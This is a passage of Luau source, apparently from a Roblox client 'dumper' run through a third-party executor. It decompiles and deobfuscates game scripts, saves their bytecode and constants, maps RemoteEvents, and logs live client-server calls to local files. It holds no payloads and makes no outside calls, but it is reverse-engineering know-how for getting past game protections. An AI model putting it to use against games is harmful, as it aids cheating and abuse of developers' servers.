	base = string.gsub(base, "%s+", "_")
	if base == "" or base == "unknown" then
		base = "script"
	end
	if #base > 60 then
		base = string.sub(base, 1, 60)
	end
	return "scripts/" .. base .. "." .. short
end

local function scriptFileName(hash, name)
	local existing = HashUsed[hash]
	if type(existing) == "table" then
		return existing.lua, hash, existing.stem, true
	end
	local stem = scriptStem(name, hash)
	local luaRel = stem .. ".lua"
	HashUsed[hash] = { lua = luaRel, stem = stem }
	return luaRel, hash, stem, false
end

local function scriptContext(entry)
	local visibility = "replicated"
	if entry.isNil then
		visibility = "nil"
	end
	for _, tag in ipairs(entry.discovery or {}) do
		if tag == "nil" then
			visibility = "nil"
		end
	end
	local executionContext = "unknown"
	if entry.class == "LocalScript" then
		executionContext = "client"
	end
	return executionContext, visibility
end

local function writeScriptMetadata()
	ensureDir(OUT .. "/scripts")
	local payload = {
		count = #ScriptMeta,
		items = ScriptMeta,
	}
	writeJson("scripts/metadata.json", payload)
end

dumpOneScript = function(entry)
	local executionContext, visibility = scriptContext(entry)
	local item = {
		path = entry.path,
		stableId = entry.stableId or (entry.script and stableIdOf(entry.script)),
		class = entry.class,
		source = entry.source,
		discovery = entry.discovery or { entry.source },
		isNil = entry.isNil,
		executionContext = executionContext,
		visibility = visibility,
	}
	local ok, err = pcall(function()
		local scriptInst = entry.script
		local started = os.clock()
		local source = nil
		local status = "skipped"
		local bytecodeBlob = nil
		local bytecodeAvailable = false
		if getBytecode then
			pcall(function()
				local bc = getBytecode(scriptInst)
				if type(bc) == "string" and #bc > 0 then
					bytecodeBlob = bc
					bytecodeAvailable = true
				end
			end)
		end
		if Config.decompile and decompileFn then
			while (os.clock() - started) < Config.timeout do
				local output, mode = decompileScript(scriptInst, bytecodeBlob)
				if output then
					source = output
					status = mode
					break
				end
				task.wait(0.15)
			end
			if status == "skipped" then
				if bytecodeAvailable then
					status = "bytecode"
				else
					status = "timeout"
					table.insert(TimedOut, entry.path)
					ScriptIndex.timedOut += 1
				end
			end
		elseif bytecodeAvailable then
			status = "bytecode"
		end
		local deobStats = { renamed = 0, foldedChars = 0, missingConstants = 0 }
		local scriptConstants = nil
		if source and (status == "decompiled" or status == "cache") then
			local cleaned
			cleaned, deobStats, scriptConstants = deobfuscateSource(source, scriptInst)
			source = cleaned
		end
		local sourceForHash = (status == "decompiled" or status == "cache") and source or nil
		local luaBody
		if sourceForHash then
			luaBody = source
		elseif bytecodeAvailable then
			luaBody = "-- bytecode stored separately; this file is not Lua source\n"
		else
			luaBody = "-- no source and no bytecode recovered\n"
		end
		local assess = assessConfidence(scriptInst, source or luaBody, status, bytecodeAvailable)
		local elapsed = os.clock() - started
		assess.elapsed = elapsed
		local pipeline = scriptPipeline(status, assess.syntax, bytecodeAvailable)
		pipeline.sourceKind = sourceForHash and "lua" or (bytecodeAvailable and "bytecode" or "none")
		pipeline.deobfuscated = (deobStats.renamed or 0) > 0 or (deobStats.foldedChars or 0) > 0
		local hash = contentHash(scriptInst, sourceForHash, bytecodeBlob)
		local relPath, storedHash, stem, reused = scriptFileName(hash, scriptInst.Name)
		local bytecodeRel = nil
		if bytecodeBlob then
			bytecodeRel = stem .. ".luau-bytecode"
			if not BytecodeWritten[storedHash] then
				writeText(bytecodeRel, bytecodeBlob)
				BytecodeWritten[storedHash] = true
			end
		end
		if Config.dumpScriptConstants and scriptConstants and not reused then
			local items = {}
			for i, c in ipairs(scriptConstants) do
				if i > 400 then
					break
				end
				table.insert(items, serializeValue(c))
			end
			writeJson(stem .. ".constants.json", {
				count = #scriptConstants,
				items = items,
				note = "getconstants on the script closure. Not original source names.",
			})
		end
		local header = string.format(
			"-- name: %s\n-- path: %s\n-- stableId: %s\n-- class: %s\n-- collected: %s\n-- discovery: %s\n-- decompile: %s\n-- deobfuscate: renamed=%d foldedChars=%d missingConstants=%d\n-- syntax: %s\n-- validation: %s\n-- bytecode: %s\n-- bytecode_file: %s\n-- constants: %s\n-- protos: %s\n-- reconstruction: %s\n-- confidence: %s\n-- contentHash: %s\n-- elapsed: %.3fs\n\n%s%s",
			tostring(scriptInst.Name),
			getFullNameForScript(scriptInst),
			tostring(item.stableId),
			entry.class,
			entry.source,
			table.concat(entry.discovery or { entry.source }, ","),
			assess.decompile,
			deobStats.renamed or 0,
			deobStats.foldedChars or 0,
			deobStats.missingConstants or 0,
			assess.syntax,
			pipeline.validation,
			tostring(bytecodeAvailable),
			tostring(bytecodeRel),
			tostring(assess.constants),
			tostring(assess.protos),
			tostring(assess.reconstructionScore),
			assess.confidence,
			storedHash,
			elapsed,
			luaBody,
			buildDebugBlock(scriptInst)
		)
		if sourceForHash then
			extractRemoteStrings(sourceForHash, entry.path, item.stableId)
		end
		local wrote = true
		if not reused then
			wrote = writeText(relPath, header)
		end
		if wrote then
			item.file = relPath
			item.hash = storedHash
			item.contentHash = storedHash
			item.status = status
			item.syntax = assess.syntax
			item.syntacticValid = assess.syntacticValid
			item.confidence = assess.confidence
			if DumperUI and DumperUI.RecordScript then
				pcall(function()
					DumperUI.RecordScript(item)
				end)
			end
			item.reconstructionScore = assess.reconstructionScore
			item.constantsMatch = assess.constantsMatch
			item.protoCountMatch = assess.protoCountMatch
			item.constants = assess.constants
			item.protos = assess.protos
			item.deobfuscate = deobStats
			item.pipeline = pipeline
			item.bytecodeAvailable = bytecodeAvailable
			item.bytecode_file = bytecodeRel
			item.source = sourceForHash ~= nil
			item.complete = sourceForHash ~= nil
			item.firstSeen = os.time()
			ScriptsDumped += 1
			if status == "decompiled" or status == "cache" then
				Coverage.scripts.decompiled += 1
				if assess.syntax == "valid" then
					Coverage.scripts.syntaxValid += 1
				end
				if pipeline.deobfuscated then
					Coverage.scripts.deobfuscated += 1
				end
			elseif status == "bytecode" then
				Coverage.scripts.bytecode_only += 1
			end
			ScriptHashByPath[entry.path] = storedHash
			if item.stableId then
				ScriptHashById[item.stableId] = storedHash
			end
			local displayPath = replacePlayerName(entry.path)
			local existingMeta = nil
			for _, meta in ipairs(ScriptMeta) do
				if (item.stableId and meta.stableId == item.stableId) or meta.path == displayPath then
					existingMeta = meta
					break
				end
			end
			if existingMeta then
				existingMeta.last_seen = os.time()
				existingMeta.discovery = entry.discovery or existingMeta.discovery
				existingMeta.path = displayPath
				if existingMeta.hash ~= storedHash then
					existingMeta.versions = (existingMeta.versions or 1) + 1
					existingMeta.hash_history = existingMeta.hash_history or { existingMeta.hash }
					table.insert(existingMeta.hash_history, storedHash)
					existingMeta.hash = storedHash
					existingMeta.contentHash = storedHash
					existingMeta.file = relPath
					existingMeta.decompile = assess.decompile
					existingMeta.syntax = assess.syntax
					existingMeta.pipeline = pipeline
					existingMeta.confidence = assess.confidence
					existingMeta.reconstructionScore = assess.reconstructionScore
					existingMeta.bytecode_file = bytecodeRel
				end
			else
				table.insert(ScriptMeta, {
					path = displayPath,
					stableId = item.stableId,
					class = entry.class,
					hash = storedHash,
					contentHash = storedHash,
					file = relPath,
					bytecode_file = bytecodeRel,
					collected = entry.source,
					discovery = entry.discovery or { entry.source },
					first_seen = os.time(),
					last_seen = os.time(),
					versions = 1,
					decompile = assess.decompile,
					syntax = assess.syntax,
					syntacticValid = assess.syntacticValid,
					constants = assess.constants,
					protos = assess.protos,
					constantsMatch = assess.constantsMatch,
					protoCountMatch = assess.protoCountMatch,
					reconstructionScore = assess.reconstructionScore,
					confidence = assess.confidence,
					deobfuscate = deobStats,
					pipeline = pipeline,
					source = pipeline.sourceAvailable,
					bytecode = bytecodeAvailable,
					validation = pipeline.validation,
					isNil = entry.isNil,
					executionContext = executionContext,
					visibility = visibility,
					complete = sourceForHash ~= nil,
				})
			end
		else
			item.status = "write_failed"
			ScriptIndex.failed += 1
			Coverage.scripts.failed += 1
		end
	end)
	if not ok then
		item.error = tostring(err)
		item.status = "error"
		ScriptIndex.failed += 1
		Coverage.scripts.failed += 1
		dbgWarn("script error", entry.path, err)
	end
	table.insert(ScriptIndex.items, item)
	ScriptSeen[entry.path] = true
	if item.stableId then
		ScriptSeen[item.stableId] = true
	end
	return item
end

local function dumpAllScripts(scriptList)
	Log.phase = "scripts"
	local total = math.min(#scriptList, Config.maxScripts)
	ScriptIndex.totalFound = #scriptList
	Coverage.scripts.discovered = #scriptList
	log("boot", string.format("decompiling %d / %d scripts (sequential job queue, threads=%d unused)", total, #scriptList, Config.threads))
	ensureDir(OUT .. "/scripts")
	writePhase("scripts_start", "total=" .. total)
	for i = 1, total do
		local entry = scriptList[i]
		dumpOneScript(entry)
		if i % 3 == 0 or i == total then
			log("prog", string.format("scripts %d/%d dumped=%d fail=%d", i, total, ScriptsDumped, ScriptIndex.failed))
			writePhase("scripts", string.format("%d/%d last=%s", i, total, entry.path))
			if DumperUI and DumperUI.UpdateProgress then
				pcall(function()
					DumperUI.UpdateProgress("scripts", string.format("Decompiling: %d / %d (%s)", i, total, entry.path), i, total)
					DumperUI.UpdateStats(total, ScriptsDumped, ScriptIndex.failed, (Coverage and Coverage.remotes and Coverage.remotes.discovered) or 0, WriteStats.ok, WriteStats.fail, OUT)
				end)
			end
		end
		if i % 15 == 0 then
			task.wait()
		end
	end
	ScriptIndex.dumped = ScriptsDumped
	writeScriptMetadata()
	if #TimedOut > 0 then
		writeText("timed-out-scripts.txt", table.concat(TimedOut, "\n"))
	end
	log("done", string.format("scripts dumped=%d failed=%d timedOut=%d", ScriptsDumped, ScriptIndex.failed, ScriptIndex.timedOut))
	writePhase("scripts_done", string.format("dumped=%d fail=%d", ScriptsDumped, ScriptIndex.failed))
end

local function readTags(inst)
	local tags = nil
	pcall(function()
		tags = inst:GetTags()
	end)
	if type(tags) == "table" and #tags > 0 then
		return tags
	end
	return nil
end

local function readAttributes(inst)
	if not Config.dumpAttributes then
		return nil
	end
	local attrs = nil
	pcall(function()
		attrs = inst:GetAttributes()
	end)
	if type(attrs) == "table" and next(attrs) then
		return serializeValue(attrs)
	end
	return nil
end

ensureRemoteRecord = function(inst)
	if typeof(inst) ~= "Instance" then
		return nil
	end
	local path = replacePlayerName(instancePath(inst))
	local rec = RemoteIndex[path]
	if rec then
		rec.last_seen = os.time()
		if rec.discovery then
			local has = false
			for _, tag in ipairs(rec.discovery) do
				if tag == "descendants" then
					has = true
					break
				end
			end
			if not has then
				table.insert(rec.discovery, "descendants")
			end
		end
		if not rec.stableId then
			rec.stableId = stableIdOf(inst)
		end
		return rec
	end
	local className = inst.ClassName
	local channel = BINDABLE_CLASSES[className] and "bindable" or "network"
	rec = {
		path = path,
		stableId = stableIdOf(inst),
		class = className,
		name = inst.Name,
		attributes = readAttributes(inst),
		tags = readTags(inst),
		channel = channel,
		discovery = { "descendants" },
		refs = { instance = true, static = {}, runtime = false },
		stats = { c2s = 0, s2c = 0, firstSeen = os.time(), lastSeen = os.time() },
		argSchema = {},
		returnSchema = {},
	}
	RemoteIndex[path] = rec
	if DumperUI and DumperUI.RecordRemote then
		pcall(function()
			DumperUI.RecordRemote(path, className, "DISCOVER", nil)
		end)
	end
	return rec
end

observeRemoteCall = function(path, className, dir, argTypes)
	local rec = RemoteIndex[path]
	if not rec then
		rec = {
			path = path,
			class = className or "Remote",
			name = string.match(path, "[^%.]+$") or path,
			channel = "network",
			discovery = { "runtime" },
			refs = { instance = false, static = {}, runtime = true },
			stats = { c2s = 0, s2c = 0, firstSeen = os.time(), lastSeen = os.time() },
			argSchema = {},
			returnSchema = {},
		}
		RemoteIndex[path] = rec
	end
	rec.refs.runtime = true
	if rec.discovery then
		local has = false
		for _, tag in ipairs(rec.discovery) do
			if tag == "runtime" then
				has = true
				break
			end
		end
		if not has then
			table.insert(rec.discovery, "runtime")
		end
	else
		rec.discovery = { "runtime" }
	end
	rec.stats.lastSeen = os.time()
	if not rec.stats.firstSeen then
		rec.stats.firstSeen = os.time()
	end
	if dir == "C2S" then
		rec.stats.c2s += 1
	elseif dir == "S2C" then
		rec.stats.s2c += 1
	end
	if DumperUI and DumperUI.RecordRemote then
		pcall(function()
			DumperUI.RecordRemote(path, className, dir, argTypes)
		end)
	end
	if type(argTypes) == "table" and #argTypes > 0 then
		rec.argSchema = argTypes
	end
end

writeRemoteCatalog = function()
	local items = {}
	for _, rec in pairs(RemoteIndex) do
		rec.refs.static = {}
		table.insert(items, rec)
	end
	table.sort(items, function(a, b)
		return a.path < b.path
	end)
	local unmatched = {}
	for _, ref in ipairs(StaticRemoteRefs) do
		local attached = false
		if ref.name then
			for _, rec in ipairs(items) do
				if rec.name == ref.name then
					table.insert(rec.refs.static, ref)
					attached = true
					rec.discovery = rec.discovery or {}
					local has = false
					for _, tag in ipairs(rec.discovery) do
						if tag == "static-source" then
							has = true
							break
						end
					end
					if not has then
						table.insert(rec.discovery, "static-source")
					end
				end
			end
		end
		if not attached then
			table.insert(unmatched, ref)
		end
	end
	local byKey = {}
	for _, ref in ipairs(unmatched) do
		local key = ref.name or (tostring(ref.method) .. "@" .. tostring(ref.script) .. ":" .. tostring(ref.line))
		byKey[key] = byKey[key] or {}
		table.insert(byKey[key], ref)
	end
	for key, refs in pairs(byKey) do
		table.insert(items, {
			path = key,
			class = "Unknown",
			name = refs[1].name or key,
			channel = "static-only",
			refs = { instance = false, static = refs, runtime = false },
			stats = { c2s = 0, s2c = 0 },
			argSchema = {},
			confidence = "LOW",
			note = "static reference only — no matching remote instance",
		})
	end
	for _, rec in ipairs(items) do
		if rec.refs.instance and rec.refs.runtime then
			rec.confidence = "HIGH"
		elseif rec.refs.instance or rec.refs.runtime then
			rec.confidence = "MEDIUM"
		else
			rec.confidence = "LOW"
		end
	end
	table.sort(items, function(a, b)
		return a.path < b.path
	end)
	local payload = {
		note = "Remote graph nodes. refs.static is text-scan (alias-aware), not a full AST. Bindables are channel=bindable.",
		count = #items,
		items = items,
	}
	ensureDir(OUT .. "/remotes")
	writeJson("remotes/catalog.json", payload)
	local edges = {}
	for _, rec in ipairs(items) do
		for _, ref in ipairs(rec.refs.static or {}) do
			table.insert(edges, {
				from = ref.scriptId or ref.script,
				to = rec.stableId or rec.path,
				method = ref.method,
				kind = "static",
			})
		end
		if rec.refs.runtime then
			table.insert(edges, {
				from = "runtime",
				to = rec.stableId or rec.path,
				kind = "observed",
				c2s = rec.stats.c2s,
				s2c = rec.stats.s2c,
			})
		end
	end
	writeJson("remotes/graph.json", { nodes = items, edges = edges, count = #edges })
	Live.lastCatalogWrite = os.clock()
end

local function dumpRemotes()
	Log.phase = "remotes"
	local all = {}
	for _, inst in ipairs(game:GetDescendants()) do
		local className = inst.ClassName
		if NETWORK_REMOTE_CLASSES[className] or BINDABLE_CLASSES[className] then
			local rec = ensureRemoteRecord(inst)
			table.insert(all, {
				class = className,
				path = rec.path,
				name = rec.name,
				channel = rec.channel,
				attributes = rec.attributes,
				tags = rec.tags,
			})
		end
	end
	table.sort(all, function(a, b)
		return a.path < b.path
	end)
	log("done", "remotes=" .. #all)
end

local function dumpValues()
	Log.phase = "values"
	local rows = {}
	local seen = {}
	local roots = { ReplicatedStorage, Workspace, LocalPlayer, StarterGui, StarterPack, Lighting }
	for _, root in ipairs(roots) do
		if root then
			for _, inst in ipairs(root:GetDescendants()) do
				local sid = stableIdOf(inst)
				if sid and seen[sid] then
					continue
				end
				if sid then
					seen[sid] = true
				end
				if inst:IsA("ValueBase") then
					local row = {
						path = replacePlayerName(instancePath(inst)),
						stableId = sid,
						class = inst.ClassName,
						name = inst.Name,
					}
					pcall(function()
						row.value = serializeValue(inst.Value)
					end)
					table.insert(rows, row)
				elseif Config.dumpAttributes then
					local attrs = inst:GetAttributes()
					if attrs and next(attrs) then
						table.insert(rows, {
							path = replacePlayerName(instancePath(inst)),
							stableId = sid,
							class = inst.ClassName,
							attributes = serializeValue(attrs),
						})
					end
				end
			end
		end
	end
	writeText("values.jsonl", "")
	for _, row in ipairs(rows) do
		local line = jsonEncode(row)
		if line then
			appendText("values.jsonl", line .. "\n")
		end
	end
	writeJson("values-all.json", {
		count = #rows,
		jsonl = "values.jsonl",
		note = "Items are in values.jsonl (HttpService cannot encode huge arrays).",
	})
	log("done", "values=" .. #rows)
end

local function dumpGui()
	Log.phase = "gui"
	local rows = {}
	local function scan(root, tag)
		if not root then
			return
		end
		for _, inst in ipairs(root:GetDescendants()) do
			if inst:IsA("GuiObject") then
				local row = {
					tag = tag,
					class = inst.ClassName,
					path = replacePlayerName(instancePath(inst)),
					name = inst.Name,
					stableId = stableIdOf(inst),
					visible = inst.Visible,
				}
				local props, complete = collectProperties(inst)
				row.properties = props
				row.complete = complete
				row.attributes = readAttributes(inst)
				row.tags = readTags(inst)
				table.insert(rows, row)
				Coverage.gui.discovered += 1
				Coverage.gui.serialized += 1
				if #rows >= Config.maxGui then
					Coverage.gui.truncated = true
					return
				end
			end
		end
	end
	scan(LocalPlayer:FindFirstChild("PlayerGui"), "PlayerGui")
	scan(StarterGui, "StarterGui")
	writeText("gui.jsonl", "")
	for _, row in ipairs(rows) do
		local line = jsonEncode(row)
		if line then
			appendText("gui.jsonl", line .. "\n")
		end
	end
	writeJson("gui-full.json", {
		count = #rows,
		jsonl = "gui.jsonl",
		truncated = Coverage.gui.truncated,
		note = "Items are in gui.jsonl (HttpService cannot encode huge arrays).",
	})
	log("done", "gui=" .. #rows)
end

local function dumpTree(root, label)
	local kept = 0
	local n = 0
	for _, inst in ipairs(root:GetDescendants()) do
		n += 1
		if n > Config.maxTreePerRoot then
			Coverage.instances.truncated = true
			break
		end
		if n % 500 == 0 then
			task.wait()
		end
		local ident = instanceIdentity(inst)
		local props, complete = collectProperties(inst)
		local row = ident
		row.properties = props
		row.complete = complete
		row.tags = readTags(inst)
		row.attributes = readAttributes(inst)
		Coverage.instances.discovered += 1
		if complete then
			Coverage.instances.serialized += 1
		elseif props and next(props) then
			Coverage.instances.serialized += 1
		else
			Coverage.instances.unschematized += 1
		end
		if inst:IsA("ValueBase") then
			pcall(function()
				row.value = serializeValue(inst.Value)
			end)
		end
		kept += 1
		local line = jsonEncode({
			root = label,
			stableId = row.stableId,
			parentId = row.parentId,
			path = row.path,
			class = row.class,
			name = row.name,
			complete = complete,
			properties = row.properties,
			value = row.value,
			attributes = row.attributes,
			tags = row.tags,
		})
		if line then
			appendText("instances.jsonl", line .. "\n")
		end
	end
	writeJson("trees/" .. label .. ".json", {
		root = label,
		count = kept,
		jsonl = "instances.jsonl",
		complete = not Coverage.instances.truncated,
		note = "Full property records are in instances.jsonl. This file is an index (HttpService cannot encode huge trees).",
	})
	log("done", "tree " .. label .. "=" .. kept)
end

local function dumpTrees()
	Log.phase = "trees"
	ensureDir(OUT .. "/trees")
	writeText("instances.jsonl", "")
	local roots = {
		{ Workspace, "Workspace" },
		{ ReplicatedStorage, "ReplicatedStorage" },
		{ ReplicatedFirst, "ReplicatedFirst" },
		{ StarterGui, "StarterGui" },
		{ StarterPack, "StarterPack" },
		{ LocalPlayer, "LocalPlayer" },
		{ Lighting, "Lighting" },
	}
	for _, pair in ipairs(roots) do
		if pair[1] then
			dumpTree(pair[1], pair[2])
		end
	end
end

local function fingerprintSig(value)
	local enc = jsonEncode(value)
	if not enc then
		enc = jsonEncode(toJsonSafe(value))
	end
	return enc and fnv1aHex(enc) or "?"
end

local function captureSnapshotState()
	local remotes, scripts, values = {}, {}, {}
	for path, rec in pairs(RemoteIndex) do
		if rec.channel == "network" then
			local key = rec.stableId or path
			remotes[key] = {
				path = path,
				class = rec.class,
				c2s = rec.stats and rec.stats.c2s or 0,
				s2c = rec.stats and rec.stats.s2c or 0,
			}
		end
	end
	for _, meta in ipairs(ScriptMeta) do
		local key = meta.stableId or meta.path
		scripts[key] = {
			path = meta.path,
			class = meta.class,
			name = meta.name or meta.path,
			hash = meta.hash or meta.contentHash,
		}
	end
	local stats = LocalPlayer and LocalPlayer:FindFirstChild("leaderstats")
	if stats then
		for _, inst in ipairs(stats:GetChildren()) do
			if inst:IsA("ValueBase") then
				local path = replacePlayerName(instancePath(inst))
				local sid = stableIdOf(inst) or path
				local ser = nil
				pcall(function()
					ser = serializeValue(inst.Value)
				end)
				values[sid] = { path = path, sig = fingerprintSig(ser) }
			end
		end
	end
	return {
		remotes = remotes,
		scripts = scripts,
		values = values,
		gui = {},
		attrs = {},
		props = {},
	}
end

local DIFF_SAMPLE = 40

local function entrySig(v)
	if type(v) ~= "table" then
		return tostring(v)
	end
	if v.sig ~= nil then
		return tostring(v.sig)
	end
	if v.hash ~= nil then
		return tostring(v.hash)
	end
	if v.c2s ~= nil or v.s2c ~= nil then
		return tostring(v.c2s or 0) .. ":" .. tostring(v.s2c or 0)
	end
	return fingerprintSig(v)
end

local function mapDiff(oldMap, newMap)
	local added, removed, changed = {}, {}, {}
	oldMap = oldMap or {}
	newMap = newMap or {}
	local addedN, removedN, changedN = 0, 0, 0
	for key, nv in pairs(newMap) do
		local ov = oldMap[key]
		if ov == nil then
			addedN += 1
			if #added < DIFF_SAMPLE then
				table.insert(added, type(nv) == "table" and (nv.path or key) or key)
			end
		else
			local osig = entrySig(ov)
			local nsig = entrySig(nv)
			if osig ~= nsig then
				changedN += 1
				if #changed < DIFF_SAMPLE then
					local path = type(nv) == "table" and (nv.path or key) or key
					table.insert(changed, { path = path, before = osig, after = nsig })
				end
			end
		end
	end
	for key in pairs(oldMap) do
		if newMap[key] == nil then
			removedN += 1
			if #removed < DIFF_SAMPLE then
				local ov = oldMap[key]
				table.insert(removed, type(ov) == "table" and (ov.path or key) or key)
			end
		end
	end
	return {
		n = addedN,
		truncated = addedN > DIFF_SAMPLE,
		sample = added,
	}, {
		n = removedN,
		truncated = removedN > DIFF_SAMPLE,
		sample = removed,
	}, {
		n = changedN,
		truncated = changedN > DIFF_SAMPLE,
		sample = changed,
	}
end

writeAnalysisReport = function()
	local validated, bytecodeOnly = 0, 0
	for _, meta in ipairs(ScriptMeta) do
		if meta.validation == "passed" then
			validated += 1
		end
		if meta.bytecode and not meta.source then
			bytecodeOnly += 1
		end
	end
	local remoteInst, runtimeObs, staticOnly, highR = 0, 0, 0, 0
	for _, rec in pairs(RemoteIndex) do
		if rec.refs.instance then
			remoteInst += 1
		end
		if rec.refs.runtime then
			runtimeObs += 1
		end
		if rec.channel == "static-only" then
			staticOnly += 1
		end
		if rec.confidence == "HIGH" then
			highR += 1
		end
	end
	ensureDir(OUT .. "/analysis")
	writeJson("analysis/report.json", {
		at = os.time(),
		scripts = {
			scriptInstances = ScriptIndex.totalFound,
			dumped = ScriptsDumped,
			validated = validated,
			bytecodeOnly = bytecodeOnly,
			syntaxValid = Coverage.scripts.syntaxValid,
		},
		remotes = {
			instances = remoteInst,
			runtimeObserved = runtimeObs,
			staticOnly = staticOnly,
			highConfidence = highR,
		},
		snapshots = Snap.n,
		coverage = Coverage,
	})
end

local function collectorCapabilities()
	return {
		filesystem = writeFile ~= nil,
		decompiler = decompileFn ~= nil,
		deobfuscate = Config.deobfuscate == true,
		bytecode = getBytecode ~= nil,
		script_hash = getScriptHash ~= nil,
		nil_instances = getNilInstances ~= nil,
		runtime_hooks = hookMeta ~= nil or hookFn ~= nil,
		instance_identity = true,
		getproperties = getPropertiesFn ~= nil,
		appendfile = appendFile ~= nil,
		requiredForSource = { "filesystem", "decompiler" },
		requiredForBytecode = { "filesystem", "bytecode" },
	}
end

local function writeAssets()
	ensureDir(OUT .. "/assets")
	local items = {}
	for _, rec in pairs(Assets) do
		table.insert(items, rec)
	end
	table.sort(items, function(a, b)
		return tostring(a.contentId) < tostring(b.contentId)
	end)
	writeJson("assets/catalog.json", {
		count = #items,
		items = items,
		note = "Normalized content IDs referenced by client-visible instances. Not a full asset download.",
	})
end

local function writeCoverage()
	local remoteDisc, remoteObs = 0, 0
	for _, rec in pairs(RemoteIndex) do
		remoteDisc += 1
		if rec.refs and rec.refs.runtime then
			remoteObs += 1
		end
	end
	Coverage.remotes.discovered = remoteDisc
	Coverage.remotes.observed = remoteObs
	ensureDir(OUT .. "/coverage")
	local scriptsDenom = Coverage.scripts.discovered
	local scriptCov = 0
	if scriptsDenom > 0 then
		scriptCov = (Coverage.scripts.decompiled + Coverage.scripts.bytecode_only) / scriptsDenom
	end
	local instDenom = Coverage.instances.discovered
	local instCov = 0
	local schematized = Coverage.instances.serialized + Coverage.instances.failed
	if schematized > 0 then
		instCov = Coverage.instances.serialized / schematized
	elseif instDenom > 0 then
		instCov = 1
	end
	local schemaCov = 0
	if instDenom > 0 then
		schemaCov = Coverage.instances.serialized / instDenom
	end
	writeJson("coverage/report.json", {
		schema = "roblox-dumper/coverage-v1",
		at = os.time(),
		complete = false,
		mode = "client",
		percent = {
			instances = instCov,
			instanceSchema = schemaCov,
			scripts = scriptCov,
		},
		instances = Coverage.instances,
		scripts = Coverage.scripts,
		remotes = Coverage.remotes,
		gui = Coverage.gui,
		assets = Coverage.assets,
		runtime = { liveEvents = Live.n, snapshots = Snap.n },
		capabilities = collectorCapabilities(),
		note = "percent.instances is serialized/(serialized+failed). Empty class schemas are unschematized, not failed. instanceSchema is serialized/discovered.",
	})
end

writeManifest = function()
	writeJson("manifest.json", {
		schema = "roblox-dumper/v0.4",
		schemaVersion = 1,
		collectorVersion = VERSION,
		version = VERSION,
		mode = "client",
		placeId = game.PlaceId,
		jobId = game.JobId,
		timestamp = os.time(),
		files = {
			metadata = "metadata.json",
			scripts = "scripts/metadata.json",
			remotes = "remotes/catalog.json",
			remoteGraph = "remotes/graph.json",
			observations = "remotes/observations.jsonl",
			instances = "instances.jsonl",
			assets = "assets/catalog.json",
			coverage = "coverage/report.json",
			live = "live/events.jsonl",
			snapshots = "snapshots/",
			analysis = "analysis/",
		},
		snapshots = Snap.n,
		scriptsDumped = ScriptsDumped,
		liveEvents = Live.n,
	})
end

takeSnapshot = function()
	if not Config.snapshotDiff or OUT == "" then
		return
	end
	if Snap.busy or Snap.n >= Config.maxSnapshots then
		return
	end
	Snap.busy = true
	Snap.n += 1
	local id = Snap.n
	local ok, err = pcall(function()
		local state = captureSnapshotState()
		local rec = {
			id = id,
			at = os.time(),
			clock = os.clock(),
			counts = { remotes = 0, scripts = 0, values = 0, gui = 0, attrs = 0, props = 0 },
			remotes = state.remotes,
			scripts = state.scripts,
			values = state.values,
			gui = state.gui,
			attrs = state.attrs,
			props = state.props,
		}
		for _ in pairs(state.remotes) do
			rec.counts.remotes += 1
		end
		for _ in pairs(state.scripts) do
			rec.counts.scripts += 1
		end
		for _ in pairs(state.values) do
			rec.counts.values += 1
		end
		for _ in pairs(state.gui) do
			rec.counts.gui += 1
		end
		for _ in pairs(state.attrs) do
			rec.counts.attrs += 1
		end
		for _ in pairs(state.props or {}) do
			rec.counts.props += 1
		end
		ensureDir(OUT .. "/snapshots")
		writeJson(string.format("snapshots/%06d.json", id), {
			id = id,
			at = rec.at,
			clock = rec.clock,
			counts = rec.counts,
			note = "Snapshot is remotes/scripts/leaderstats from in-memory indexes. No descendant walk.",
		})
		if Snap.last then
			local prev = Snap.last
			local diff = { from = prev.id, to = id, at = rec.at }
			diff.remotesAdded, diff.remotesRemoved, diff.remotesChanged = mapDiff(prev.remotes, rec.remotes)
			diff.scriptsAdded, diff.scriptsRemoved, diff.scriptsChanged = mapDiff(prev.scripts, rec.scripts)
			diff.valuesAdded, diff.valuesRemoved, diff.valuesChanged = mapDiff(prev.values, rec.values)
			diff.guiAdded, diff.guiRemoved, diff.guiChanged = mapDiff(prev.gui, rec.gui)
			diff.attrsAdded, diff.attrsRemoved, diff.attrsChanged = mapDiff(prev.attrs, rec.attrs)
			diff.propsAdded, diff.propsRemoved, diff.propsChanged = mapDiff(prev.props, rec.props)
			local encoded = jsonEncode(diff)
			if encoded then
				appendText("analysis/diffs.jsonl", encoded .. "\n")
			end
		end
		Snap.last = rec
		Snap.lastAt = os.clock()
		pcall(writeManifest)
		pcall(writeAnalysisReport)
		pcall(writeCoverage)
		log("done", string.format("snapshot %06d remotes=%d scripts=%d values=%d", id, rec.counts.remotes, rec.counts.scripts, rec.counts.values))
	end)
	Snap.busy = false
	if not ok then
		dbgWarn("snapshot failed", err)
	end
end

--[=[ live intercept ]=]
livePush = function(event)
	if not Core.running or not Config.liveIntercept then
		return
	end
	Live.n += 1
	event.seq = Live.n
	event.t = os.time()
	event.clock = os.clock()
	if not event.thread then
		event.thread = tostring(coroutine.running())
	end
	local dir = event.dir or "?"
	local method = event.method or event.kind or "?"
	event.method = method
	event.kind = method
	local target = event.remote or event.name or event.path or "?"
	local argsText = event.argsText or ""
	local line = string.format(
		"%d\t%s\t%s\t%s\t%s\n",
		Live.n,
		os.date("%H:%M:%S", event.t),
		dir .. ":" .. method,
		target,
		argsText
	)
	table.insert(Live.pending, event)
	Live.pendingNet ..= line
	table.insert(Live.recent, event)
	if #Live.recent > 500 then
		table.remove(Live.recent, 1)
	end
	if Config.liveConsole or (Config.debug and Live.n <= 30) then
		dbg("LIVE", dir, method, target, argsText)
	end
	if Live.n % Config.liveFlushEvery == 0 then
		pcall(flushLiveLogs)
	end
end

flushLiveLogs = function()
	if OUT == "" or not writeFile then
		return
	end
	ensureDir(OUT .. "/live")
	local pending = Live.pending
	local pendingNet = Live.pendingNet
	local flushed = 0
	if pendingNet ~= "" then
		local okNet = appendText("live/net.log", pendingNet)
		if okNet then
			Live.pendingNet = ""
		end
	end
	if #pending > 0 then
		local lines = {}
		for _, ev in ipairs(pending) do
			local line = jsonEncode(ev)
			if not line then
				line = jsonEncode(toJsonSafe(ev))
			end
			if line then
				table.insert(lines, line)
			end
		end
		if #lines == 0 or appendText("live/events.jsonl", table.concat(lines, "\n") .. "\n") then
			flushed = #pending
			local obs = {}
			for _, ev in ipairs(pending) do
				if ev.dir == "C2S" or ev.dir == "S2C" then
					local ol = jsonEncode(ev)
					if not ol then
						ol = jsonEncode(toJsonSafe(ev))
					end
					if ol then
						table.insert(obs, ol)
					end
				end
